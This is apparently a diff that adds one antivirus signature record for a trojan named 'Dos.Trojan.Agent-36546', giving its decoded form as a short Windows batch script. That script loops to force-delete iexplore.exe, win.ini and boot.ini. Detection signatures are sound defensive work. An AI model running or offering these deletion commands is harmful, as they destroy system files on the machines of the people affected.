@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36546
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off :try @del /f /q "c:\program files\internet explorer\iexplore.exe" if exist "c:\program files\internet explorer\iexplore.exe" goto try @echo off :try @del /f /q "c:\windows\win.ini" @del /f /q "c:\windows\boot.ini" if exist "c:\windows\win.ini" goto try 
